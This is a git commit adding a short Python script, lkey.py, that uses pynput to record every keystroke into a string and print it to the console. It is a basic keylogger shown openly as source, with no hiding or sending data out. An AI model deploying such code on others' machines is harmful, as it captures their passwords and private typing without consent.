d7335cf22d05f2a23f523435f29adabfd9d46fe8
DeAdWoLf1425 <78585562+DeAdWoLf1425@users.noreply.github.com>
2022-06-28 11:44:24 +0530

    Add files via upload

---
+++ lkey.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python3
+import pynput.keyboard
+log = ""
+def process_keys(key):
+	global log
+	try:
+		log = log + str(key.char)
+	except AttributeError:
+		if key == key.space:
+			log = log + " "
+		else:
+			log = log + " " + str(key) + " "
+	print(log)
+	
+keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
+with keyboard_listener:
+	keyboard_listener.join() 
